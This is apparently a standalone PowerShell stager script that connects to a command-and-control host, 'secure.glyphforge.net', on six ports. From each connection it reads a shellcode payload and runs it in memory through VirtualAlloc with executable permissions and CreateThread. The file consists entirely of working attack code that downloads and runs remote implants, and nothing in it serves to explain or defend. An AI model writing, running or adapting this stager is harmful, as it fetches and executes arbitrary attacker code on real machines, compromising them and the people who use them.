$C2 = "secure.glyphforge.net"

function Invoke-TCPStage($host, $port) {
    try {
        $client = New-Object System.Net.Sockets.TcpClient($host, $port)
        $stream = $client.GetStream()

        # Read 4 byte size header
        $sizeBytes = New-Object byte[] 4
        $stream.Read($sizeBytes, 0, 4) | Out-Null
        $size = [System.BitConverter]::ToInt32($sizeBytes, 0)

        # Read shellcode
        $shellcode = New-Object byte[] $size
        $received = 0
        while ($received -lt $size) {
            $received += $stream.Read($shellcode, $received, $size - $received)
        }
        $client.Close()

        # Execute shellcode in memory
        $kernel32 = Add-Type -MemberDefinition @"
            [DllImport("kernel32")]
            public static extern IntPtr VirtualAlloc(
                IntPtr lpAddress, uint dwSize,
                uint flAllocationType, uint flProtect);
            [DllImport("kernel32")]
            public static extern bool VirtualFree(
                IntPtr lpAddress, uint dwSize, uint dwFreeType);
            [DllImport("kernel32")]
            public static extern IntPtr CreateThread(
                IntPtr lpThreadAttributes, uint dwStackSize,
                IntPtr lpStartAddress, IntPtr lpParameter,
                uint dwCreationFlags, IntPtr lpThreadId);
            [DllImport("kernel32")]
            public static extern uint WaitForSingleObject(
                IntPtr hHandle, uint dwMilliseconds);
"@ -Name "Kernel32" -Namespace "Win32" -PassThru

        $addr = [Win32.Kernel32]::VirtualAlloc(
            [IntPtr]::Zero, $shellcode.Length, 0x3000, 0x40)  # MEM_COMMIT|RESERVE, PAGE_EXECUTE_READWRITE
        [System.Runtime.InteropServices.Marshal]::Copy(
            $shellcode, 0, $addr, $shellcode.Length)
        $thread = [Win32.Kernel32]::CreateThread(
            [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
        [Win32.Kernel32]::WaitForSingleObject($thread, 500) | Out-Null

        return $true
    } catch {
        return $false
    }
}

Write-Host "[*] Staging implants..."

# Windows DNS
Invoke-TCPStage $C2 2111
Invoke-TCPStage $C2 2112

# Windows HTTPS
Invoke-TCPStage $C2 2221
Invoke-TCPStage $C2 2222

# Windows MTLS
Invoke-TCPStage $C2 2331
Invoke-TCPStage $C2 2332

Write-Host "[*] Done"
